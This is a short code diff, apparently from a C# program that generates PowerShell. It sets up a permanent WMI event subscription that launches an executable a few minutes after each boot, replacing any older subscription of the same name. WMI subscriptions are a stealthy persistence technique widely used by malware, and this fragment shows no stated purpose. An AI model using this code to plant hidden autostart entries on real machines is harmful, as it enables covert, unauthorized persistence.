@@ -641,7 +641,7 @@ try {{ gwmi -NS $ns CommandLineEventConsumer -Filter ""Name='$n'"" -EA 0 | Remov
 try {{ gwmi -NS $ns __EventFilter -Filter ""Name='$n'"" -EA 0 | Remove-WmiObject }} catch {{}}
 $f = ([wmiclass]""\\.\root\subscription:__EventFilter"").CreateInstance()
 $f.QueryLanguage = 'WQL'
-$f.Query = ""SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'""
+$f.Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 600""
 $f.Name = $n; $f.EventNameSpace = 'root\cimv2'; $null = $f.Put()
 $c = ([wmiclass]""\\.\root\subscription:CommandLineEventConsumer"").CreateInstance()
 $c.Name = $n; $c.ExecutablePath = '{safePath}'; $c.CommandLineTemplate = '""' + '{safePath}' + '""'; $null = $c.Put()
